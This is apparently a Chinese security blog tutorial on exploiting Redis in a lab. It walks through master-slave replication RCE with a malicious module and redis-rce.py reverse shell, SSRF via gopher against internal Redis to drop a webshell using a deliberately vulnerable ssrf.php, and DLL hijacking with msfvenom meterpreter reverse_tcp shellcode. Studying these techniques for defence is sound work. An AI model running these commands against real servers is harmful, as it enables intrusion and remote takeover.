#  全文干货！Redis漏洞利用详解 （下）   
原创 LULU  红队蓝军   2024-09-18 19:00  
  
**redis主从复制getshell**  
  
redis当读写体量比较大的时候，影响服务端效率，从而Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以减轻流量  
  
在全量复制过程中,恢复rdb文件,如果我们将rdb文件构造为恶意的exp.so,从节点即会自动生成,使得可以RCE  
  
在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的  
  
**复现步骤**  
```
1、开启redis数据库，注意4.X以上需要redis.conf关闭保护模式、
2、在kali上连接靶机redis服务，并设置主从状态（将kali设置为redis主机）
3、在kali上编译恶意代码，生成module.so
   ---git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand  #下载工具
   ----cd RedisModules-ExecuteCommand/
   ---- make  #编译
4、kali利用redis-rce工具进行getshell
    ---- git clone https://github.com/Ridter/redis-rce  #下载工具
5、将module.so文件放到利用工具目录下
    ---cd redis-rce/
    ---cp ../RedisModules-ExecuteCommand/src/module.so ./  #将.so工具放到redis-rce目录下
    ---pip install -r requirements.txt 
    ---python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so   #执行反弹shell。当然这里也可以执行交互式shell
6、kali进行监听

```  
  
**执行反弹shell复现**  
  
1、将kali设置为主机  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaXSMibO9ibiaiaejrvhIzSD1mWLGVgw95gXrvKu1hVwaJFdF1XsnhvsKqNg/640?wx_fmt=png&from=appmsg "")  
  
2、下载并编译，得到恶意.so  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbafI9Y2DuUCib0GDZDkiarNOoNaKlgyHvYjF0AuNUgTJSSkZNFrxiazLScQ/640?wx_fmt=png&from=appmsg "")  
  
  
3、下载redis--rce工具，并将恶意.so文件放在该目录下  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbah1S92bMWk1GUNrQD0tWLec5ULjAC9a9Q33tGqM0HXv5dpiafUZaXXOQ/640?wx_fmt=png&from=appmsg "")  
  
  
4、攻击端执行,kali监听  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaibcsDP0ziaP61t9hGjt43RDicoia11mNiaH3fTgyvRy4sf055ThFPUIzwxQ/640?wx_fmt=png&from=appmsg "")  
### ssrf攻击内网redis  
  
什么是gopher协议  
  
gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。  
  
gopher协议包格式:  
```
URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流

- gopher的默认端口是70

- 如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&也需要进行URL编码

```  
#### 复现  
#### 1、搭建lamp网站  
  
快速建站，将lamp网站存在ssrf漏洞，将它作为一个跳板，攻击redis服务器  
  
1.1  lamp网站的搭建  
```
docker官方镜像仓库   https://hub.docker.com/
拉取mattrayner/lamp镜像
运行镜像 需要映射到/opt/www

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaKpx0XNPXWabFyl1Y5zfhX1XJbEJ4zOFnxDS5h69PPqZFurY8G2zQGw/640?wx_fmt=png&from=appmsg "")  
  
1.2在该网站下,写入带有ssrf漏洞的程序  
```
ssrf.php

<?php
// 获取参数
$url = isset($_GET['url']) ? $_GET['url'] : "";
if ($url){
// 初始化curl
$ch = curl_init();
// 设置URL参数
curl_setopt($ch, CURLOPT_URL, $url);
// 设置是否返回响应头
curl_setopt($ch, CURLOPT_HEADER, 0);
// 执行
$result = curl_exec($ch);
// 关闭
curl_close($ch);
}

导致ssrf漏洞产生的问题：没有对URL进行过滤

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaaBjqC0xuPZSDTwcxtwevP5t5AibIsBhEIEmdZoHJxDFPCrpVlHbw8sw/640?wx_fmt=png&from=appmsg "")  
#### 2、创建redis服务器  
  
redis官网 https://redis.io  
```
$ wget https://download.redis.io/releases/redis-5.0.5.tar.gz
$ tar xzf redis-5.0.5.tar.gz
$ cd redis-5.0.5
$ make
# 如果出现找不到make，执行：aptre install -y make gcc g++
服务端开启：./src/redis-server  如果服务端开启要指定配置文件 ./src/redis-server redis.conf

客户端运行：./src/redis-cli

```  
  
配置文件redis.conf  
```
protected-mode no         关闭保护模式。默认是开启保护模式的，本地可以操作，外网不行
#bind 127.0.0.1           所有都允许访问。如果没有注释，通常只能是服务器或者内网的IP进行访问

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbag6ktGuamUVM4CfIDbcicB6PtibZQyxs4wxfEia5hMjHxgLH0Lgb7xicKBw/640?wx_fmt=png&from=appmsg "")  
  
漏洞探测  
  
通过服务器上搭建的网站访问baidu，确定存在ssrf漏洞  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaiakPPLHMIIGeVS7FaduCPJiaXhBbhvHTwDDFjUHibXDCjj3JJ0mVX7PSg/640?wx_fmt=png&from=appmsg "")  
  
探测服务  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaKCib1CdlE96mgCSNt6Rk2qGXKhJrjibT9Te1y93Ggh5a52jeHn2lAfCw/640?wx_fmt=png&from=appmsg "")  
  
基于上述 ：已经确定存在SSRF漏洞，且端口6379是开放的，存在redis服务  
  
可以利用gopher协议，攻击redis拿下服务器  
#### 3、利用gopher协议包  
  
利用GitHub上开源的生成gopher协议规则包的工具：  
  
https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher  
  
下载工具包，查看readme.txt文档  
  
3.1编辑redis.cmd,创建木马病毒的文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbahmIcqxykYibYorhKcnonn41VrvZibR9UnRHF2sWbDDiabXB7I8cZXrcqg/640?wx_fmt=png&from=appmsg "")  
  
3.2利用工具生成gopher协议包  
  
生成payload  
```
python redis-over-gopher.py

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaF2ttrOo39xCkE110wtCINGZbQ2eSgHTCjSmc5CjPKv6akLeibPafyyQ/640?wx_fmt=png&from=appmsg "")  
  
3.3 对生成的payload进行URL编码  
  
利用burp自带的编码功能或者使用在线编码  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbatbWQe2IxP70BDjnvsZZNST7iayUTTW7A9vLPTOy8ICczzvicySaOr4yg/640?wx_fmt=png&from=appmsg "")  
  
3.4 访问  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbayg9g8mhrQ1KoW4rsbVkVzAdAKw8GWT7JYfxLjgM0RGC0S6nD74ic3Nw/640?wx_fmt=png&from=appmsg "")  
  
3.5 查看是否木马文件  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaM64yPxia1WPWicVIrsU2lneyJHUgPnl4dR1ia2xcKdvandJQA03sYTv7g/640?wx_fmt=png&from=appmsg "")  
  
3.6  探针  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbafww7lgLlGJdKXkKwOGjEib0yo6bcnqGnSlmEQshlXc06osibUxCUiasSQ/640?wx_fmt=png&from=appmsg "")  
#### 4、蚁剑连接  
  
webshell 管理工具：蚁剑 菜刀 哥斯拉 冰蝎  
  
拿下redis服务器  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaF1d0P5o2tsaHMXUaS9Rm26d8Uk6ytSgDK0rvDwHtaft9moeAUwkJYg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaVKaQYFX2vQZYGia5FpLPC8gXbgiaTzvwRzk4pzJgeiaAglGCnFIdZuuRw/640?wx_fmt=png&from=appmsg "")  
  
当然dict协议也可以利用  
### Redis DLL劫持的利用  
  
DLL：Windows的动态链接库，简单来说，就是一部分Windows平台下的通用代码并没有写在程序里，而是当程序需要使用时去DLL里调用。DLL劫持：当程序没有指定DLL的绝对路径时，就会按一定顺序查找DLL，从而攻击者有机会在优先级更高的目录里放置恶意DLL  
  
启用"安全DLL查找模式"时，查找顺序如下：  
```
a. 应用程序所在目录；

b. 系统目录。[**GetSystemDirectory**](http://msdn.microsoft.com/en-us/library/ms724373(v=vs.85).aspx)返回的目录，通常是系统盘\Windows\System32；

c. 16位系统目录。该项只是为了向前兼容的处理，可以不考虑；

d. Windows目录。[**GetWindowsDirectory**](http://msdn.microsoft.com/en-us/library/ms724454(v=vs.85).aspx)返回的目录，通常是系统盘\Windows；

e. 当前目录。GetCurrentDirectory返回的目录；

f. 环境变量PATH中所有目录。

```  
#### 漏洞复现  
  
**1、寻找DLL劫持目标**  
  
连接redis使用bgsave命令，查看缺少的dll  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaqewxzI0ibTyW13aBaXLz78cEfl66CltS4ibvEP9k9Z0FziaFYURG5aWtw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbapmlQvjeynltXC4ialAq1iaSh5Ck74TO73S2HVf3icfJqkLkQdULF6fPVA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaPLOFxia4pZslFLgLbXhGrE9535HDGhFVz7IpHwjjXSo6ck9iawFATD2A/640?wx_fmt=png&from=appmsg "")  
  
调用完应用程序目录里的恶意DLL后会调用原DLL，dbghelp.dll系统自带，可以直接拿来利用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbakIPN5iadHnL0liadrQQcQHKmk3AgwqiaBOs4Mk0yFR1N55PUNC73gmjibA/640?wx_fmt=png&from=appmsg "")  
  
**漏洞利用**  
  
**不出网——Metasploit-反向shell**  
  
1、使用dllHijack工具（https://github.com/P4r4d1se/dll_hijack），执行后生成dbghelp.dll项目  
```
python DllHijacker.py dbghelp.dll

```  
  
2、msf生成payload，让meterpreter的流量指向Linux出网主机的6666端口：msfvenom -p windows/x64/meterpreter/reverse_tcp  LHOST=IP LPORT=6666 -f c -o shellcode  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaYoODeOsnVnZ91ibNKNQCmFgEWhrT7ibmZibxOEf3N53nODt8ZTFiaSj0hA/640?wx_fmt=png&from=appmsg "")  
  
将kali中生成的shellcode替换到dbghelp.dll项目，并使用主从复制将修改后的dll写入到目标指定位置 (利用工具：RedisWriteFile工具)，目标靶机中将会写入恶意的dll文件  
```
python RedisWriteFile.py --rhost=IP --rport=6379 --lhost=IP --rpath="C:\\Users\\superman\\Desktop\\Redis-x64-3.0.504\\" --rfile="dbghelp.dll" --lfile="dbghelp.dll"

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbaHTI7M6dBn7XgfupFaVsr2icl1ZGaVVf0ZcTiahz1fUrfjX5DgicNxQpbg/640?wx_fmt=png&from=appmsg "")  
  
在redis客户端连接执行bgsave，尝试触发劫持dll，msf监听，收到shell  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v5JHkCKzLSl0WOjHDTuYsbarBvndiacF8xmibtdzTiaGyKcwGx6XUlqqXgqrf6WJOoNickbLibvumu43sw/640?wx_fmt=png&from=appmsg "")  
  
  
加下方wx，拉你一起进群学习  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
